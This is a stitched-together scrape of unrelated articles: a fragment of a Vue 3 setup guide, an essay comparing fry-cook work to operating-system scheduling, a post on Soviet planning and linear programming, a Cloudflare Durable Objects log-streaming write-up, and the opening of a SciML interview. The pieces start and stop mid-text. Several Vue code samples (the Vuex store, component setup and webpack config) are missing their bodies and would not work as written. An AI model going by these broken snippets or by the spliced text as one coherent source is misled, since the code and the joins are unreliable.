<span>        </span><span>return</span><span> </span><span>this</span><span>.</span><span>postTitle</span><span>.</span><span>split</span><span>(</span><span>'</span><span> </span><span>'</span><span>)</span><span>.</span><span>length</span><span>;</span>
<span>    </span><span>}</span>
<span> </span><span>}</span>
<span>}</span></code></pre>
<p>And then in your <code>&lt;template&gt;</code> you could reference those data/methods/computed properties:</p>
<pre><code><span>&lt;</span><span>template</span><span>&gt;</span>
<span> </span><span>&lt;</span><span>h1</span><span>&gt;{{</span><span> </span><span>postTitle</span><span> </span><span>}}&lt;/</span><span>h1</span><span>&gt;</span>
<span> </span><span>&lt;</span><span>p</span><span>&gt;</span><span>Post has </span><span>{{</span><span> </span><span>numWordsInTitle</span><span> </span><span>}}</span><span> words</span><span>&lt;/</span><span>p</span><span>&gt;</span>
<span> </span><span>&lt;</span><span>button</span><span> </span><span>@click</span><span>=</span><span>"</span><span>updateTitle</span><span>(</span><span>'</span><span>something new</span><span>'</span><span>)</span><span>"</span><span>&gt;</span><span>Update to 'something new'</span><span>&lt;/</span><span>button</span><span>&gt;</span>
<span>&lt;/</span><span>template</span><span>&gt;</span></code></pre>
<p><strong>To convert from that 'old' Vue 2 options API to using the <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-composition-api/">Vue 3 composition API</a></strong>, you would instead do the following:</p>

<p>The <code>&lt;template&gt;...&lt;/template&gt;</code> part would be the same as the above. Anything returned from <code>setup()</code>'s object will be available to use in the <code>&lt;template&gt;</code>.</p>
<p>For a very small example of a Vue 3 component which uses <code>setup()</code> and then uses the data returned from that function within <code>&lt;template&gt;</code>, check out <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter/blob/main/src/components/layout/components/Sidebar.vue" target="_blank" rel="noopener">this example component</a></p>
<p>There is much more that can be said about the composition API. But this is just a brief introduction. I have a more <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-composition-api/">in-depth overview of Vue 3's composition API here</a>.</p>
<h3 id="set-up-vue-3-with-sassscss">Set up Vue 3 with Sass/SCSS</h3>
<p>It is very easy to set up Sass with Vue 3, which I always prefer as it makes writing CSS a little nicer.</p>
<p>Basic setup of Sass in Vue 3 is quite easy: <code>yarn add -D sass-loader sass</code>. I have written more about <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-global-scss-sass-variables/">setting up Sass in Vue 3 here (including global config)</a></p>
<h3 id="setting-up-vuex-in-vue-3">Setting up Vuex in Vue 3</h3>
<p>There are some arguments that Vuex will not be needed as often, thanks to the <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-composition-api/">composition API in Vue 3</a>. But I think for large applications it will still be a staple part of using Vue.</p>
<p><code>yarn add vuex</code></p>
<p>(I'm using 4.0.0, which works with Vue 3)</p>
<p>In your <code>main.js</code> or <code>main.ts</code> file you will need to set it up like this:</p>
<pre><code><span>import</span><span> </span><span>{</span><span> </span><span>createApp</span><span> </span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue</span><span>'</span>
<span>import</span><span> </span><span>{</span><span>createStore</span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vuex</span><span>'</span>
<span>import</span><span> </span><span>App</span><span> </span><span>from</span><span> </span><span>'</span><span>./App.vue</span><span>'</span><span>;</span><span> </span><span>// Your main component</span>

<span>const</span><span> </span><span>store</span><span> </span><span>=</span><span> </span><span>createStore</span><span>(</span><span>{</span>

<span>    </span><span>},</span>
<span>    getters</span><span>:</span><span> </span><span>{</span>

<p>Once you have your Vue 3 Vuex config set up, you just need to access the store in your Vue 3 components.</p>
<p>One way to do this is via the composition API:</p>
<pre><code><span>import</span><span> </span><span>{</span><span>computed</span><span>,</span><span> </span><span>defineComponent</span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue</span><span>'</span><span>;</span>

<span>export</span><span> </span><span>default</span><span> </span><span>defineComponent</span><span>(</span><span>{</span>

<span>    </span><span>return</span><span> </span><span>{</span>
<span>      </span><span>post</span><span>,</span>

<h3 id="using-typescript-in-vue-3">Using Typescript in Vue 3</h3>
<p>Vue 3 fully supports Typescript. The fact that it works so well now with Typescript is one of my favourite new things about Vue 3. It was always a bit hard to get everything typed correctly in Vue 2. </p>
<p>It is still possible to use plain Javascript with Vue 3, if you are not keen on Typescript.</p>
<p><strong>This section of my Vue 3 guide explains how to install and set up Typescript with a Vue 3 installation.</strong></p>
<p>For the configuration to set up Typescript in Vue 3 I would recommend looking <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter/blob/main/tsconfig.json" target="_blank" rel="noopener">at this tsconfig.json</a>. </p>
<p>There are some packages which will need to be installed.</p>
<p>If you originally set up Vue via the Vue CLI and are adding Typescript manually then run <code>yarn add -D @vue/cli-plugin-typescript</code>.</p>
<p>For custom setups you will need <code>yarn add -D typescript vue-loader</code> (check out package.json in that repo). </p>
<p>You will also need to update or create your <code>webpack.config.js</code> config file. The important lines are marked below with <code>&lt;&lt;</code>.</p>
<pre><code><span>const</span><span> </span><span>path</span><span> </span><span>=</span><span> </span><span>require</span><span>(</span><span>'</span><span>path</span><span>'</span><span>)</span>

<span>      </span><span>}</span>
<span>    ]</span>
<span>  </span><span>}</span>
<span>}</span></code></pre>
<p>Once set up, all you have to do is change <code>&lt;script&gt;</code> to <code>&lt;script lang="ts"&gt;</code> in your <code>.vue</code> files.</p>

<p>Most people thought I was crazy for doing this, but I spent the last few months of my gap year working as a short order cook at a family-owned fast-food restaurant. (More on this <a href="https://offlinemark.com/2020/11/12/gap-year-restaurant/">here</a>.) I’m a programmer by trade, so I enjoyed thinking about the restaurant’s systems from a programmer’s point of view. Here’s some thoughts about two such systems.</p>



<h2>Double, triple, and even quadruple fetching</h2>



<p>Human systems, at first glance, can appear broken, but due to subtle human factors, they might actually work just fine.</p>



<p>My best example is the system for taking and fulfilling orders. We never wrote anything down, and would re-ask orders multiples times, including when ringing customers up. (In computer security, this is known as a <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch/">double fetch</a>.) Not great service and can theoretically let customers lie and pay less. </p>



<p>In practice most customers didn’t mind <em>too</em> much, liars are rare, and we can loosely detect when something seems off with an order.</p>



<p>Writing orders down and asking strictly once seems optimal but has subtle flaws. For one thing, there’s not enough space behind the counter for everyone to walk to the written order, so it requires more internal communication. This will fail during a rush when you’re blocked on order details and coworkers are too busy for questions. <strong>Customers are always idle; coworkers aren’t</strong>.</p>



<p>It can increase confusion if order slips aren’t thrown out when orders are finished and is also logistically (and literally) messy if you have greasy gloves and want to avoid touching a pen, then food. Lastly, many of my coworkers were older and very used to the existing system. <strong>A major transition to a new system would have generated more confusion than it’s worth</strong>.</p>



<h2>Scheduling algorithms for the fry cook</h2>



<p>While I covered a range of duties including the cash register, milkshake machine, and grill, I spent the most time on the deep fryer. I’m delighted to present this overanalysis of life as a fry cook, from a programmer’s point of view.</p>



<p>This is what deep fryers look like (<a href="https://www.google.com/url?sa=i&amp;url=https%3A%2F%2Fwww.nachi.org%2Fdeep-fryer-inspection.htm&amp;psig=AOvVaw1D90dsceyn1wmU-KOGAEuy&amp;ust=1605391502547000&amp;source=images&amp;cd=vfe&amp;ved=0CAIQjRxqFwoTCNCq-sPDgO0CFQAAAAAdAAAAABAE">source</a>):</p>



<div><figure><img loading="lazy" src="https://i0.wp.com/d12m281ylf13f0.cloudfront.net/images10-2/commercial-fryer-2.jpg?resize=360%2C352&amp;ssl=1" alt="Deep Fryer" width="360" height="352" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/d12m281ylf13f0.cloudfront.net/images10-2/commercial-fryer-2.jpg?resize=360%2C352&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>This picture has 2 fryers, each with 2 baskets that can be submerged to sit in the vats of hot oil below. At work, only 1 fryer would be active on any given day which effectively allows 2 items to be fried at the same time.</p>



<p><strong>Fry cooks have a lot in common with operating systems in that they are both responsible for scheduling</strong>. Operating systems schedule threads to run on a limited number of cores; fry cooks schedule food to be fried in a limited number of fryers. Different food items have different priorities, and different lengths of time to cook.</p>



<p>French fries, curly fries, and onion rings (collectively, “fries”) are the main menu items from the deep fryer. Each fry order could be large or small (except for rings which were only large) and eat-in or to-go. The job of the fry cook is to:</p>



<ul><li>Accept fry orders from the greeter.</li><li>Allocate portions of fries from the big bags of raw fries</li><li>Cook them in the fryers</li><li>Put them into the appropriate eat-in/to-go container</li><li>Serve them onto the customer’s tray on the counter, or their to-go bag</li></ul>



<p>The goal is to do this with maximum speed and accuracy and without dropping orders. You’ll ideally minimize the number of times you ask customers and coworkers for order details. In addition, there are a few sources of complexity to handle:</p>



<ul><li><strong>Incomplete information</strong>: Depending on the greeter, they may forget to specify if it’s eat-in or to-go. You can always ask the customer, but the grill chef will likely ask the same question in a little bit. You might be able to save a customer ask if you can eavesdrop on that interaction.</li><li><strong>Timing requirements</strong>: You need to finish orders by the time the grill chef finishes the burgers/hot dogs, but you shouldn’t finish too early. If you put the fries on the counter way before the burgers are ready, they’ll get cold. This matters less for to-go orders, which you can serve into the bag immediately.</li><li><strong>Scale</strong>: During a rush, you might receive many orders per minute, while only being able to process 1-2 per minute. Once the greeter relays the order, they forget it, so it’s up to you to remember. And remember: no writing things down.</li><li><span><strong>Waste avoidance</strong>: </span>Sometimes you or another cook will make too many fries. To avoid wasting them, you can use the excess towards a future order by refreshing them with a splash later and adding them to a fresh batch.</li><li><strong>Changing orders</strong>: Customers sometimes change their order after you’ve started cooking (e.g. regular fry to curly fry). Now you have to figure out what to do with the partially cooked portion currently in the fryer.</li><li><strong>Miscellaneous items</strong>: In addition to fries, there other items that need to be scheduled for time in the fryer, including chicken patties, bacon, clam strips, and fish fillets. </li></ul>



<p>A few techniques to manage all this:</p>



<ul><li><strong>Batching orders together</strong>. If a large and small fry order are in the queue, you can cook them in the same basket at the same time.<ul><li>Some customers request their fries “well done”, meaning cooked extra long. This makes batching more complicated.</li></ul></li><li><strong>“Wait n Splash”</strong>: If a fry order is done cooking far before the rest of the grill items and you don’t have pressing items that need fryer time, you can raise the basket from the oil, but leave the food in it. When the grill items finish, you can quickly splash the food back in the oil to refresh it, then serve it. This will prevent it from getting cold on the counter.</li><li><strong>Inactive fryer baskets</strong>: It can be handy to have extra storage space for cooked food. If you have a “wait n splash” order waiting, but you have more orders to fry, you can use the 2 spare baskets from the inactive fryer to store the waiting order and free up the fryer slot. This is also useful when customers change their order and you need to quickly stash the half cooked portion somewhere and start the adjusted order.</li><li><strong>“The tong dip”</strong>: If both fryers are in use and the grill chef hands you bacon to be urgently cooked, you can hold the bacon in tongs and dip it into one of the submerged baskets. This lets you effectively cook more than 2 things at the same time.</li></ul>



<p>Here’s the system I ended up using. When a new order came in, I’d stop whatever I was doing and grab the appropriate container and place it in the corresponding fry bucket. This captures all 3 pieces of information about the order (fry type, size, to-go?) letting me forget it. If I strictly follow this, I can just process the containers in the buckets like a queue. However, I still need to keep a sense of order memorized because the system doesn’t capture global ordering – if I have containers in the fry, curly fry, and onion ring buckets, I can’t tell which order came in first.</p>



<p>I don’t have a solution for this. On a super busy day, this system falls apart and I drop orders. Extreme load like that has only happened a few times and in that case, I just make large batches, forget about syncing up with the grill items, and hope I don’t have too much excess at the end. Generally, the system worked nicely.</p>



<h2>Conclusion</h2>



<p>It’s fun to think about human systems, like those in a restaurant, from a programmer’s point of view. A fry cook’s job closely resembles that of an operating system scheduler, complete with optimization points and edge cases. One can try to optimize human systems as if they were computer systems, but it’s critical to understand the subtle human aspects of the system when evaluating improvements.</p>

<p>As a data scientist, a big part of my job involves picking metrics to optimize and thinking about how to do things as efficiently as possible. With these types of questions on my mind, I recently discovered a totally fascinating book about about economic problems in the USSR and the team of data-driven economists and computer scientists who wanted to solve them. The book is called <a href="http://www.amazon.com/Red-Plenty-Francis-Spufford/dp/1555976042"><em>Red Plenty</em></a>. It’s actually written as a novel, weirdly, but it nevertheless presents an accurate economic history of the USSR. It draws heavily on an earlier book from 1973 called <a href="http://www.amazon.com/Planning-Problems-USSR-Contribution-Mathematical/dp/0521202493"><em>Planning Problems in the USSR</em></a>, which I also picked up. As I read these books, I couldn’t help but notice some parallels with planning in any modern organization. In what will be familiar to any data scientist today, the second book even includes a quote from a researcher who complained that 90% of his time was spent cleaning the data, and only 10% of his time was spent doing actual modeling!</p>

<p>Beyond all the interesting parallels to modern data science and operations research, these books helped me understand a lot of interesting things I previously knew very little about, such as linear programming, price equilibria, and Soviet history. This blog post is about I learned.</p>

<h4>Balance sheets and manual calculation: Kind of a trainwreck</h4>

<p>The main task in the centrally planned Soviet economy was to allocate resources so that a desired assortment of goods and services was produced. Every year, certain target outputs for each good were established. Armed with estimates of the available input resources, central administrators used balance sheets to set plans for every factory, specifying exactly how much input commodities each factory would receive, and how much output it should produce. Up through the 1960s, this was always done by manual calculation. Since there were hundreds of thousands of commodities, and since the supply chains had many dependency steps, it was impossible to compute the full balance sheets for the economy. The administrators therefore decided to make some simplifying assumptions. As a result of these these simplifying assumptions, resource allocation became a bit of a trainwreck. Below are a few of the simplifications and their consequences.</p>

<ul>
  <li><strong>Dimensionality reduction by removing variables.</strong> Because there were too many commodities to track, administrators often limited their analysis to the 10,000 most important commodities in the economy. But when the production of those commodities were planned, there was often a hidden shortage of commodities whose output was not planned centrally but which were used as inputs to one of the 10,000 planned products. Factories that depended on those commodities often sat idle for months as they waited for the shortages to end.</li>
  <li><strong>Dimensionality reduction by aggregation.</strong> Apparently, steel tubes can come in thousands of different types. They can come in different lengths, different shapes, and different compositions. To reduce the dimensionality of the problem, administrators would often track the total tonnage of a few broad classes of steel tubes in the models, rather than using a more detailed classification scheme. While their models successfully balanced the tonnage of tubes for the broad categories (the output in tons of tube-producing factories matched the input requirements in tons of tube-consuming factories), there were constant surpluses of some specific types of tubes, and shortages of other specific types of tubes.&nbsp;In particular, since tonnage was used as a metric, tube-producing factories were overly incentivized to make easy-to-produce thick tubes. As a result, thin tubes were always in short supply.</li>
  <li><strong>Propagating adjustments only a few degrees back.</strong> Let’s say that during balance calculations, the administrators realized they needed to bump up the target output of one commodity. If they did that, it was also necessary to bump up the output targets of commodities that were input into the target commodity. But if they did <em>that</em>, they also needed to bump up the output targets of commodities that fed into those commodities, and so on! This involved a crazy amount of extra hand calculations every time they needed make an adjustment. To simplify things, the administrators typically made adjustments to the first-order suppliers, without making the necessary adjustments to the suppliers of the suppliers. This of course led to critical shortages of input commodities, which again led to idle factories.</li>
</ul>

  <p><strong>Figure 1.</strong> Some example inputs and outputs in the Soviet economy in 1951, described in units of weight. This summary shows an extreme dimensionality reduction, more extreme than was ever used in planning. In this diagram, most commodities are excluded and each displayed commodity collapses across multiple different product types. Multiple steps in the supply chain are collapsed into a single step. (Source: <a href="http://www.foia.cia.gov/sites/default/files/document_conversions/89801/DOC_0000380738.pdf">CIA</a>)</p>
</div>

<p><br>Even if the administrators could get the accounting correct, which they couldn’t, their attempts to allocate resources would still be far from optimal. In the steel industry, for example, some factories were better at producing some types of tubes whereas others were better at producing other types of tubes. Since there were thousands of different factories and tube types, it was non-trivial to decide how to best distribute resources and output requirements, and it was not immediately obvious which factories should be expanded and which should be closed down.</p>

<h4>Supply chain optimizations</h4>

<p>In the late 1960’s, a group of economists and computer scientists known as the “optimal planners” began to push for a better way of doing things. The group argued that a technique called <a href="https://www.math.ucla.edu/~tom/LP.pdf">linear programming</a>, invented by <a href="https://en.wikipedia.org/wiki/Leonid_Kantorovich">Leonid Kantorovich</a>, could optimally solve the problems with the supply chain. At a minimum, since the process could be computerized, it would be possible to perform more detailed calculations than could be done by hand, with less dimensionality reduction. But more importantly, linear programming allowed you to optimize arbitrary objective functions given certain constraints. In the case of the supply chain, it showed you how to efficiently allocate resources, identifying efficient factories that should get more input commodities, and inefficient factories that should be shut down.</p>

  <p><strong>Figure 2.</strong> Leonid Kantorovich, inventor of linear programming and winner of the 1975 Nobel Prize in Economics.</p>
</div>

<p><br>The optimal planners had some success here. For example, in the steel industry, about 60,000 consumers requested 10,000 different types of products from 500 producers. The producers were not equally efficient in their production. Some producers were efficient for some types of steel products, but less efficient for other types of steel products. Given the total amount of each product requested, and given the constraints of how much each factory can produce, the goal was decide how much each factory should produce of each type of product. If we simplify the problem by just asking how much each factory should produce without considering how the products will be distributed to the consuming factories, this becomes a straightforward application of the <a href="https://www.math.ucla.edu/~tom/LP.pdf">Optimal Assignment Problem</a>, a well-studied example in linear programming. If we additionally want to optimize distribution, taking into account the distance-dependent costs of shipments from one factory to another, the problem becomes more complicated but is still doable. The problem becomes similar to the <a href="https://www.math.ucla.edu/~tom/LP.pdf">Transportation Problem</a>, another well-studied example in linear programming, but in this case generalized to multiple commodities instead of just one.</p>

<p><img src="https://chris-said.io/assets/steel_tubes.jpg" height="200"></p>

<p>By introducing linear programming, the optimal planners were modestly successful at improving the efficiency of some industries, but their effect was limited. First, political considerations prevented many of the recommendations surfaced by the model from being implemented. Cement factories that were known to be too inefficient or too far away from consumers were allowed to remain open even though the optimal solution recommended that they be closed. Second, since the planners were only allowed to work in certain narrow parts of the economy, they never had an opportunity to propagate their recommendations back in the supply chain, although one could imagine extending the models to do so. Third, and perhaps most importantly, the value of each commodity was set by old-school administrators in an unprincipled way, and so the optimal planners were forced to optimize objective functions that didn’t even make sense.</p>

<h4>Ideas about optimizing the entire economy</h4>

<p>While the optimal planners were able to improve the efficiency of a few industries, they had more ambitious plans. They believed they could use linear programming to optimize the entire economy and outperform capitalist societies. Doing so involved more than just scaling out the supply chain optimizations adopted by certain industries. It involved shadow prices and interest rates, and a few other things I’ll admit I don’t totally understand. But while I don’t really understand the implementation, I feel like the broader goal of the planners is easier to understand and explain:</p>

<p>Basically, in a completely free market, at least under <a href="https://en.wikipedia.org/wiki/Arrow%E2%80%93Debreu_model">certain assumptions</a>, prices are supposed to converge to what’s called a General Equilibrium. The equilibrium prices have a some nice properties. They balance aggregate supply and demand, so that no commodities are in shortage or surplus. They are also <a href="https://en.wikipedia.org/wiki/Pareto_efficiency">Pareto efficient</a>, which means that nobody in the economy can be made better off without making someone else worse off.</p>

<p>The optimal planners thought that they could do better. In particular, they pointed to two problems with capitalism: First, prices in a capitalist society were determined by individual agents using trial and error to guess the best price. Surely these agents, who had imperfect information, were not picking the exactly optimal prices. In …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>A few weeks ago, Cloudflare announced Durable Objects: a <a href="https://blog.cloudflare.com/introducing-workers-durable-objects/">"truly serverless approach to storage and state"</a>, which piqued our interest here at <a href="https://linc.sh/">Linc</a>. We're already big proponents of Cloudflare Workers (Workers is our <a href="https://linc.sh/why-cloudflare">recommended deploy target</a>, after all), so we're always interested in what new capabilities that platform is getting. But it was this section that sounded <em>ideal</em> for solving a particularly annoying UX problem with much less code/infrastructure than we'd assumed we would need (see the <a href="#building-this-without-durable-objects">comparison section</a> at the end).</p><blockquote><em>Historically ... there was no way to control which instance received a request, [so] there was no way to force two clients to talk to the same Worker... Durable Objects change that: </em><strong><em>requests related to the same topic can be forwarded to the same object, which can then coordinate between them, without any need to touch storage</em></strong><em>.</em></blockquote><p>This is a big deal. And, after a few days tinkering, we've been able to successfully deploy our solution to production! In this post we'll talk about the problem we solved, how Durable Objects work, we'll go through the code and what it's like working with them, and then look at just how much work it saved us.</p><blockquote><strong><em>Note:</em></strong><em> Durable Objects are in </em><a href="http://www.cloudflare.com/cloudflare-workers-durable-objects-beta"><em>limited beta</em></a><em>, and "not recommended for production use" (yet). However, our use-case doesn't push any of the </em><a href="https://developers.cloudflare.com/workers/learning/using-durable-objects#limitations-during-the-beta"><em>beta limits</em></a><em> and we're using it to </em><a href="#the-client"><em>progressively enhance</em></a><em> our existing solution, so we've felt safe </em><a href="#demo"><em>deploying it</em></a><em> to production already!</em></blockquote><h2>The problem—streaming build logs</h2><p>While Linc is a product focussed on automating deployments and previewing each commit, a big part of the day-to-day usage is building commits from source into a <a href="https://fab.dev/">FAB</a>, and viewing the logs of that process is a core piece of the product:</p><figure><p><img src="https://uploads-ssl.webflow.com/5d4b7c4a71ecaf63b7b03f8a/5fad68c90ccf85995706ac8a_98383039-e31a9580-2043-11eb-89ee-ca0fd3a9481a.png" alt="image"></p></figure><p>When you're first getting set up, or when something changes in your build or goes awry, you can find yourself poring over these logs to find and fix your issue. And so being able to watch them "live", as they're being built, is a useful tool in reducing your feedback loop (and of course Linc is big on <a href="https://linc.sh/blog/bottleneck">reducing feedback loops</a>!). But that turns out to be an annoyingly difficult feature to implement.</p><p>For starters, most of the time a build will start before any clients are watching (but not always e.g. when restarting a build after a config change). In this case, you need to accumulate a partial build log <em>somewhere</em> so it's ready to send it to the first client to connect. And multiple clients might be watching the same build, and disconnect/reconnect at any moment, too. It's not intractable, but it's just complex enough to be tricky.</p><h3>Our current compromise: reuse our existing GraphQL subscriptions</h3><p>Until now, we've taken a pragmatic approach: use GraphQL subscriptions to periodically flush the entire `Build` record, logs included, every few seconds. This actually reuses our existing live-update infrastructure that powers almost every view in the app:</p><figure><p><img src="https://uploads-ssl.webflow.com/5d4b7c4a71ecaf63b7b03f8a/5fae92591d7dddb3a6e3cd2c_Current%20Implementation.png" loading="lazy" alt=""></p></figure><p>So while updates are triggered from DB events, using a GraphQL subscription server in this way gives us an important guarantee: <strong>the clients are <em>always</em> getting the full snapshot of the data that they're interested in</strong>. In other words, <em>any</em> change to a record in the DB results in the client getting a full update of any affected queries from the server—there's no need to manage or merge updates on the client, it can simply replace its local cache with the latest update. It makes a fully live UI <em>much</em> easier to implement, at the expense of some redundant data transfer.</p><p>As a general pattern, it's worked fantastically for us. But to send each log of a current build line-by-line it's way way <em>way</em> too heavy. Not just in terms of sending way more data than necessary, but we'd be absolutely thrashing our Dynamo table &nbsp;<em>even if nobody's watching the logs currently</em>. So, we've taken a compromise: use the existing infrastructure and flush the logs to the DB every ~10 seconds. Most builds take between 2 and 4 minutes so it's only a handful of extra writes, and it feels OK for a stop-gap. We've had an open ticket to build out a dedicated log-streaming solution but the <a href="#building-this-without-durable-objects">amount of additional infrastructure</a> put us off. That is until Durable Objects came along...</p><h2>What are Durable Objects?</h2><blockquote><em>Note: it's worth reading the </em><a href="https://blog.cloudflare.com/introducing-workers-durable-objects/"><em>introductory blog post</em></a><em> to get a background, but this is my best attempt at a TL;DR:</em></blockquote><p>Durable Objects are a way of defining a serverless function as an <strong>instance of a JS class</strong>. They can't be reached by external HTTP requests directly, instead a "normal" (i.e. stateless) Worker creates/accesses instances using their <strong><em>namespace</em></strong> (usually the name of their class) and an <strong><em>id</em></strong>. For a given <strong><em>namespace</em></strong> &amp; <strong><em>id</em></strong>, there will be <strong>exactly one</strong> instance, somewhere in the world, and it can store data. Instances communicate with workers over normal HTTP requests/responses, and support websockets.</p><p>If you find that a bit confusing, you're not alone! I didn't really "get" it until I'd read an example, so I've reproduced and commented our Worker and Object code in <a href="#the-solution">The Solution</a> section below.</p><h3>Durable Objects? "Stateful workers"? "Materialised actors"?</h3><p>I hope it's not terribly controversial, but I'm not a big fan of the name "Durable Objects". It conjures a very data-centric model, where it sounds like a way to... maybe define classes that magically run in the cloud, and where instances... maybe get "frozen" and stored when they go idle? It presents it like a type of database, whereas the reality is much closer to the Worker/Serverless model, just with per-worker storage.</p><p>That said, the phrase "workers with per-worker storage" <em>massively</em> downplays how incredibly transformative this concept is, though, so I get that Cloudflare <em>want</em> it to sound like a "whole new thing". But conceptually, you may be better thinking about these as "materialised <a href="https://en.wikipedia.org/wiki/Actor_model">actors</a>" or, as we've come to coining them internally "stateful workers".</p><p>We'll just call them "Objects" and "instances" in the remainder of this blog post.</p><h3>Instances as a kind of "state"</h3><p>In the documentation, there's a lot of focus on the fact that an Object has its own key-value storage using `controller.storage`. But that API is available only once you have a live <em>instance</em> of an Object, and getting <em>there</em> is actually a whole type of state in disguise.</p><p>The key phrase is <a href="https://blog.cloudflare.com/introducing-workers-durable-objects/#what-is-a-durable-object">here</a>:</p><blockquote><em>Each object has a globally-unique identifier. That object exists in only one location in the whole world at a time. Any Worker running anywhere in the world that knows the object's ID can send messages to it. All those messages end up delivered to the same place.</em></blockquote><p>Combine this with the fact that each Object instance supports websockets, suddenly you can define a system where, as long as two endpoints share some kind of <strong><em>key</em></strong>, they can pass messages directly (kind of the way WebRTC connections are possible when two computers can't talk directly, but can both talk to a <a href="https://en.wikipedia.org/wiki/Traversal_Using_Relays_around_NAT">TURN server</a>). And it turns out, for Linc to stream live build logs to the browser, that's exactly what we need.</p><h2>The solution</h2><p>We already have an ideal shared key: the git SHA of the current commit being built. We actually use the `tree_id` of the commit, not the commit sha, because a `tree_id` is a hash of <em>only the underlying code</em>, not its history or commit message (an aside: this is how Linc can release instantly when you merge an up-to-date PR, without waiting for a new build).</p><p>The solution has 4 components:</p><figure id="w-node-d2c300e41a9b-86b04042"><p><img src="https://uploads-ssl.webflow.com/5d4b7c4a71ecaf63b7b03f8a/5fae92d434933bbb702fde0a_Cloudflare%20Architecture.png" loading="lazy" alt=""></p></figure><ul role="list"><li>The "normal" Cloudflare <strong>Worker</strong> that receives requests from the client/builder and connects them to the appropriate Object instance.</li><li>The Durable <strong>Object</strong> itself, which maintains a list of current clients, a history of logs, and broadcasts new log entries from the builder to each client.</li><li>The <strong>Builder</strong>, which is the machine in our AWS cluster that runs `npm run fab:build` on the source code. It hasn't needed to change very much, but now sends logs to the Worker as well as saving them to Dynamo. We sometimes call this "build server" or just "server" in the code.</li><li>The <strong>Client</strong>, which is our normal React app, that needs to reconcile "live" logs from the Worker with the existing data from GraphQL.</li></ul><h3>The Worker</h3><p>It's fair to say that this is the piece that I was most confused about after reading the <a href="https://developers.cloudflare.com/workers/learning/using-durable-objects">guide</a>. It feels like you should just be able to deploy the Object itself and talk to it directly, but the Worker layer makes a lot of sense once it fits into the bigger picture: it's the only way <strong><em>clients</em></strong> (who talk HTTP to their nearest edge location) can talk to <strong><em>Object instances</em></strong> (which run in exactly one place worldwide). </p><p>The simplest possible Worker would look like this:</p><p>--CODE:language-js--<br>export default {<br> &nbsp;async fetch(request, env) {<br> &nbsp; &nbsp;// Convert our key into a Object ID<br> &nbsp; &nbsp;const id = env.MyObjectNamespace.idFromName('some-fixed-value')<br> &nbsp; &nbsp;// Connect to that instance, booting it if necessary<br> &nbsp; &nbsp;const instance = await env.MyObjectNamespace.get(id)<br> &nbsp; &nbsp;// Forward the current HTTP request to it<br> &nbsp; &nbsp;return instance.fetch(request)<br> &nbsp;}<br>}</p><p>Note that this worker uses a single key for all requests (<em>`'some-fixed-value'`</em>) which means <em>_</em>every<em>_ </em>request would be directed to a <em>_</em>single Object instance<em>_</em>. This is almost certainly not what you want in production, but it was handy when getting started (particularly if you change <em>`'some-fixed-value'` </em>once or twice, so you can be sure you're getting a new instance from the last time you deployed).</p><p>Our Worker isn't actually much more complex, but parses the route to find the <em>`tree_id` </em>to direct all requests for a particular build to a shared instance:</p><div><p>--CODE:language-js--<br>export default {<br> &nbsp;async fetch(request, env) {<br> &nbsp; &nbsp;const { pathname } = new URL(request.url)</p><p> &nbsp; &nbsp;// Pro tip: put the parsing of the route in a static method on the Object so you can use it in both places<br> &nbsp; &nbsp;// (note: the Worker and Object have to be in the same file to share the helper function)<br> &nbsp; &nbsp;const route = DurableBuildLog.toRouteParams(pathname)<br> &nbsp; &nbsp;if (!route.match) return notFound()</p><p> &nbsp; &nbsp;// Validate that the Client has access to this Site's build logs<br> &nbsp; &nbsp;if (route.client) {<br> &nbsp; &nbsp; &nbsp;if (!await clientHasAccess(route.sitename, request.headers)) {<br> &nbsp; &nbsp; &nbsp; &nbsp;return notAuthorized()<br> &nbsp; &nbsp; &nbsp;}<br> &nbsp; &nbsp;}</p><p> &nbsp; &nbsp;// Validate that the Build Server is …</p></div></div></div></div></div>

What is your background? what is your current position?</h2><p id="dea8">I am an applied mathematics instructor at MIT, the Director of Scientific Research at Pumas-AI, and a senior research analyst at the University of Maryland, School of Pharmacy. My background is numerical differential equations and systems biology, where my PhD was in new methods for efficient solving of stochastic differential equations to model the control of randomness in the developing zebrafish hindbrain.</p><h2 id="ba5c">What is SciML? Why was it born and what’s its purpose?</h2><p id="57c0">Before the “SciML” organization, there was just DifferentialEquations.jl and JuliaDiffEq, but it grew beyond just a single project. There were methods for symbolically manipulating equations, sparse automatic differentiation, automated model discovery, neural PDE solvers, and even packages in Python and R for using these tools. So the name didn’t fit and we did a reorganization around the central principle: scientific machine learning. Scientific machine learning is a burgeoning field that mixes scientific computing, like differential equation modeling, with machine learning. That is the essence of the organization: many tools for scientific simulation with differential equation solvers, chemical reaction network tools and N-body simulators, but all of them can compose with machine learning.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1920/1*YtKzMw7VOvNbOCsOkXwU0A.png" width="960" height="750" srcset="https://miro.medium.com/max/552/1*YtKzMw7VOvNbOCsOkXwU0A.png 276w, https://miro.medium.com/max/1104/1*YtKzMw7VOvNbOCsOkXwU0A.png 552w, https://miro.medium.com/max/1280/1*YtKzMw7VOvNbOCsOkXwU0A.png 640w, https://miro.medium.com/max/1400/1*YtKzMw7VOvNbOCsOkXwU0A.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*YtKzMw7VOvNbOCsOkXwU0A.png?q=20"></p></div></div></div></figure><h2 id="a3cb">Scientific Computing and Machine Learning are often perceived as very different areas. What would you say are the strengths and weaknesses of each one and how does SciML take advantage of them?</h2><p id="5be4">Scientific computing generally requires a lot of prior knowledge about the system. You need to be able to create a “mechanistic model”, which requires knowing the physical laws, the chemicals which react, or other way to mathematically encode each interaction of the 